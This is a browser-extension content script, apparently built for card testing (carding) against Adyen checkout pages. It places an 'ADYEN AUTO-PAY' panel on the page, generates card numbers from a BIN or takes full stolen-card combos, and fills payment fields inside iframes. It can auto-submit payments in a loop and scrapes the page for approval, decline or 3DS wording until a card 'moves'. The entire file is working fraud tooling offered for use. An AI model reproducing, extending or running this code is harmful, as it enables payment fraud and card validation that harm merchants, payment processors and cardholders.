"use strict";

(function () {
  const cfgKey = "adyenPayload";
  let running = false;
  let stopRequested = false;
  let hitCount = 0;

  function getConfig() {
    return new Promise((resolve) => {
      chrome.storage.local.get([cfgKey], (res) => {
        resolve(res[cfgKey] || null);
      });
    });
  }

  function setConfig(cfg) {
    return new Promise((resolve) => {
      chrome.storage.local.set({ [cfgKey]: cfg }, resolve);
    });
  }

  function setNativeValue(el, value) {
    const proto = el instanceof HTMLTextAreaElement
      ? HTMLTextAreaElement.prototype
      : el instanceof HTMLSelectElement
        ? HTMLSelectElement.prototype
        : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, "value");
    desc.set.call(el, value);
    el.dispatchEvent(new Event("input", { bubbles: true }));
    el.dispatchEvent(new Event("change", { bubbles: true }));
    el.dispatchEvent(new Event("blur", { bubbles: true }));
  }

  function buildPanel() {
    if (document.getElementById("nono-panel")) return;

    const panel = document.createElement("div");
    panel.id = "nono-panel";
    panel.style.cssText = [
      "position:fixed", "top:14px", "right:14px", "z-index:2147483647",
      "width:310px", "background:#0f1115", "color:#e6e6e6",
      "font-family:Segoe UI,monospace", "border:1px solid #00d1b2",
      "border-radius:10px", "padding:14px", "box-shadow:0 8px 30px rgba(0,0,0,.6)",
      "font-size:12px", "user-select:none"
    ].join(";");

    panel.innerHTML = `
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
        <b style="color:#00d1b2;font-size:13px">ADYEN AUTO-PAY</b>
        <button id="nono-min" style="background:none;border:none;color:#888;cursor:pointer;font-size:16px">_</button>
      </div>

      <label style="font-size:10px;text-transform:uppercase;color:#888">Custom BIN</label>
      <input id="nono-bin" type="text" placeholder="e.g. 411111111111" maxlength="19"
             style="width:100%;box-sizing:border-box;padding:7px;background:#171a21;color:#e6e6e6;border:1px solid #2a2e38;border-radius:5px;margin:4px 0 8px 0">

      <label style="font-size:10px;text-transform:uppercase;color:#888">Or Full Combo (number|mm|yyyy|cvc)</label>
      <input id="nono-combo" type="text" placeholder="4111 1111 1111 1111|12|2027|123"
             style="width:100%;box-sizing:border-box;padding:7px;background:#171a21;color:#e6e6e6;border:1px solid #2a2e38;border-radius:5px;margin:4px 0 8px 0">

      <div style="display:flex;align-items:center;gap:6px;margin-top:10px;font-size:11px">
        <input type="checkbox" id="nono-autosubmit" style="width:auto">
        <label for="nono-autosubmit" style="color:#888">Auto Submit</label>
        <input type="checkbox" id="nono-autoonload" style="width:auto;margin-left:12px">
        <label for="nono-autoonload" style="color:#888">Auto on Load</label>
      </div>

      <div style="display:flex;gap:6px;margin-top:8px">
        <button id="nono-start" style="flex:2;padding:10px;background:#00d1b2;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer">START HIT</button>
        <button id="nono-stop" style="flex:1;padding:10px;background:#2a2e38;color:#e6e6e6;border:none;border-radius:6px;cursor:pointer">STOP</button>
      </div>

      <div style="margin-top:10px;font-size:11px;color:#9be" id="nono-log">Ready, Chief.</div>
      <div style="margin-top:5px;font-size:11px;color:#ffcc00" id="nono-count">Hits: 0</div>
      <div id="nono-results" style="margin-top:6px;max-height:160px;overflow-y:auto;font-size:11px"></div>
    `;

    document.body.appendChild(panel);

    const log = panel.querySelector("#nono-log");
    const count = panel.querySelector("#nono-count");
    const results = panel.querySelector("#nono-results");

    function logMsg(msg) {
      log.textContent = msg;
    }

    function updateCount() {
      count.textContent = "Hits: " + hitCount;
    }

    function logResult(icon, text, color) {
      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px solid #1d2129;color:" + color + ";white-space:nowrap;overflow:hidden;text-overflow:ellipsis";
      line.innerHTML = icon + " " + text;
      results.prepend(line);
      while (results.children.length > 8) results.lastChild.remove();
    }

    panel.querySelector("#nono-bin").addEventListener("input", savePanelState);
    panel.querySelector("#nono-combo").addEventListener("input", savePanelState);
    panel.querySelector("#nono-autosubmit").addEventListener("change", savePanelState);
    panel.querySelector("#nono-autoonload").addEventListener("change", savePanelState);
    panel.querySelector("#nono-min").addEventListener("click", () => {
      panel.style.transform = "translateX(110%)";
      panel.style.transition = "transform .25s";
    });

    panel.querySelector("#nono-start").addEventListener("click", startHit);
    panel.querySelector("#nono-stop").addEventListener("click", () => {
      stopRequested = true;
      logMsg("Stopped by Chief.");
    });

    function savePanelState() {
      const bin = panel.querySelector("#nono-bin").value.trim();
      const combo = panel.querySelector("#nono-combo").value.trim();
      const autoSubmit = panel.querySelector("#nono-autosubmit").checked;
      const autoOnLoad = panel.querySelector("#nono-autoonload").checked;
      getConfig().then((cfg) => {
        cfg = cfg || {};
        cfg.bin = bin;
        cfg.combo = combo;
        cfg.autoSubmit = autoSubmit;
        cfg.autoOnLoad = autoOnLoad;
        cfg.enabled = true;
        setConfig(cfg);
      });
    }

    function startHit() {
      const bin = panel.querySelector("#nono-bin").value.trim();
      const combo = panel.querySelector("#nono-combo").value.trim();
      if (!bin && !combo) {
        logMsg("Give me a BIN or a full combo first, Chief.");
        return;
      }
      savePanelState();
      stopRequested = false;
      hitCount = 0;
      updateCount();
      results.innerHTML = "";
      logMsg("Hitting...");
      runHits();
    }

    window.__nonoLog = logMsg;
    window.__nonoUpdate = updateCount;
    window.__nonoResult = logResult;
  }

  function parseCombo(combo) {
    const parts = combo.split("|").map((s) => s.trim());
    return { number: parts[0] || "", month: parts[1] || "", year: parts[2] || "", cvc: parts[3] || "" };
  }

  async function huntAndFill(card, holder) {
    const frames = Array.from(document.querySelectorAll("iframe"));
    const filled = { number: false, month: false, year: false, cvc: false };
    let foundAny = false;

    for (const frame of frames) {
      let fdoc = null;
      try {
        fdoc = frame.contentDocument || frame.contentWindow.document;
        if (!fdoc) continue;
      } catch (e) {
        continue;
      }

      const inputs = Array.from(fdoc.querySelectorAll("input"))
        .filter((i) => i.offsetParent !== null || i.type !== "hidden");

      for (const inp of inputs) {
        const id = (inp.id || "") + " " + (inp.name || "") + " " +
          (inp.getAttribute("aria-label") || "") + " " +
          (inp.getAttribute("autocomplete") || "");
        const lower = id.toLowerCase();

        if (/card.*number|ccnum|cardnumber|pan/i.test(lower) && !filled.number) {
          setNativeValue(inp, card.number);
          filled.number = true;
          foundAny = true;
        } else if (filled.number && !filled.month && /expiry.*(month|date)|expmonth/i.test(lower)) {
          setNativeValue(inp, card.month || card.expiryMonth);
          filled.month = true;
          foundAny = true;
        } else if (filled.month && !filled.year && /expiry.*year|expyear/i.test(lower)) {
          setNativeValue(inp, (card.year || card.expiryYear).slice(-2));
          filled.year = true;
          foundAny = true;
        } else if (/cvc|cvv|cid/i.test(lower) && !filled.cvc) {
          setNativeValue(inp, card.cvc);
          filled.cvc = true;
          foundAny = true;
        }
      }
    }

    const holderInputs = Array.from(document.querySelectorAll(
      'input[name*="holder"], input[id*="holder"], input[autocomplete*="name"]'
    ));
    holderInputs.forEach((el) => setNativeValue(el, holder));

    fillShadowFields(card, holder, () => { foundAny = true; });

    return filled;
  }

  function fillShadowFields(card, holder, onFill) {
    const inputAttrs = [
      'input[autocomplete="cc-number"]',
      'input[autocomplete="cc-name"]',
      'input[autocomplete="cc-exp"]',
      'input[autocomplete="cc-csc"]',
      'input[name*="cardNumber"]',
      'input[id*="cardNumber"]',
      'input[name*="expiry"]',
      'input[id*="expiry"]',
      'input[name*="cvc"]',
      'input[name*="securityCode"]'
    ];
    const seen = new Set();
    inputAttrs.forEach((sel) => {
      document.querySelectorAll(sel).forEach((el) => {
        if (seen.has(el)) return;
        seen.add(el);
        const nameLower = ((el.name || "") + (el.id || "")).toLowerCase();
        if (/card.*number/.test(nameLower) || el.autocomplete === "cc-number") {
          setNativeValue(el, card.number);
          onFill && onFill();
        } else if (el.autocomplete === "cc-name") {
          setNativeValue(el, holder);
        } else if (el.autocomplete === "cc-exp") {
          setNativeValue(el, (card.month || card.expiryMonth) + "/" + (card.year || card.expiryYear).slice(-2));
          onFill && onFill();
        } else if (/cvc|csc|security/.test(nameLower)) {
          setNativeValue(el, card.cvc);
          onFill && onFill();
        }
      });
    });
  }

  function submitClick(tries = 0) {
    const buttons = Array.from(document.querySelectorAll("button, [role='button']"));
    for (const b of buttons) {
      const rect = b.getBoundingClientRect();
      if (rect.width === 0 && rect.height === 0) continue;
      const t = (b.innerText || "").toLowerCase();
      if (/pay|continue|submit|confirm/i.test(t)) {
        b.click();
        return true;
      }
    }
    if (tries < 6) {
      return new Promise((r) => setTimeout(() => r(submitClick(tries + 1)), 900));
    }
    return false;
  }

  function readPageText() {
    const texts = [];
    texts.push((document.body && document.body.innerText) || "");
    document.querySelectorAll("iframe").forEach((f) => {
      try {
        texts.push((f.contentDocument && f.contentDocument.body && f.contentDocument.body.innerText) || "");
      } catch (e) {}
    });
    return texts.join(" ").toLowerCase();
  }

  function detectResult() {
    const text = readPageText();
    const bad = [
      "declined", "refused", "invalid card number", "unsupported card", "expired",
      "not supported", "no sufficient", "insufficient", "invalid number",
      "cannot be used", "rejected", "failed", "do not honor",
      "card number is invalid", "security code is incorrect", "card expired"
    ];
    const good = [
      "thank you", "payment successful", "payment complete", "approved",
      "processing", "verifying", "3d secure", "3ds", "challenge",
      "redirecting", "almost done", "your payment was made"
    ];
    for (const g of good) {
      if (text.includes(g)) {
        const is3ds = /3ds|3d secure|challenge|verif/i.test(text);
        return { ok: true, label: is3ds ? "3DS CHALLENGE" : "PROCESSED" };
      }
    }
    for (const b of bad) {
      if (text.includes(b)) {
        return { ok: false, label: b.toUpperCase() };
      }
    }
    return null;
  }

  async function runHits() {
    const cfg = await getConfig();
    if (!cfg) return;
    running = true;

    while (!stopRequested && running) {
      let card;
      if (cfg.combo) {
        const p = parseCombo(cfg.combo);
        card = { number: p.number.replace(/\s/g, ""), month: p.month, year: p.year, cvc: p.cvc, holder: cfg.holder || "JOHN DOE" };
      } else {
        card = window.CardGen.genCard(cfg.bin.replace(/\s/g, ""), { length: cfg.cardLength || 16 });
        card.holder = cfg.holder || "JOHN DOE";
      }

      window.__nonoLog && window.__nonoLog("Hit #" + (hitCount + 1) + " -> " + card.number);
      const filled = await huntAndFill(card, card.holder);
      await new Promise((r) => setTimeout(r, 700));

      if (cfg.autoSubmit && (filled.number || filled.month || filled.cvc)) {
        const clicked = submitClick();
        if (!clicked) {
          window.__nonoResult && window.__nonoResult("&#9888;&#65039;", "no pay button found", "#ffcc00");
        }
      }

      await new Promise((r) => setTimeout(r, 2600));

      let res = detectResult();
      if (!res) {
        const submitted = cfg.autoSubmit;
        if (!filled.number && !filled.month && !filled.cvc) {
          res = { ok: false, label: "FIELDS NOT FOUND" };
        } else if (submitted) {
          res = { ok: false, label: "NO VISIBLE RESULT" };
        } else {
          res = { ok: true, label: "CARD FILLED" };
        }
      }

      hitCount++;
      window.__nonoUpdate && window.__nonoUpdate();
      const icon = res.ok ? "&#9989;" : "&#10060;";
      const color = res.ok ? "#00d1b2" : "#ff5d5d";
      window.__nonoResult && window.__nonoResult(icon, "N" + hitCount + " " + card.number + " -> " + res.label, color);

      if (res.ok && (res.label === "PROCESSED" || res.label === "3DS CHALLENGE")) {
        window.__nonoLog && window.__nonoLog("It moved, Chief. " + res.label + " -> stopping.");
        stopRequested = true;
      }

      await new Promise((r) => setTimeout(r, 900));
    }

    running = false;
    window.__nonoLog && window.__nonoLog("Cycle stopped.");
  }

  async function init() {
    buildPanel();
    const cfg = await getConfig();
    if (cfg) {
      const binEl = document.getElementById("nono-bin");
      const comboEl = document.getElementById("nono-combo");
      const asEl = document.getElementById("nono-autosubmit");
      const aolEl = document.getElementById("nono-autoonload");
      if (binEl) binEl.value = cfg.bin || "";
      if (comboEl) comboEl.value = cfg.combo || "";
      if (asEl) asEl.checked = !!cfg.autoSubmit;
      if (aolEl) aolEl.checked = !!cfg.autoOnLoad;
      if (cfg.enabled && cfg.autoOnLoad) {
        setTimeout(() => {
          const b = document.getElementById("nono-start");
          if (b) b.click();
        }, 1500);
      }
    }
  }

  setTimeout(init, 800);
})();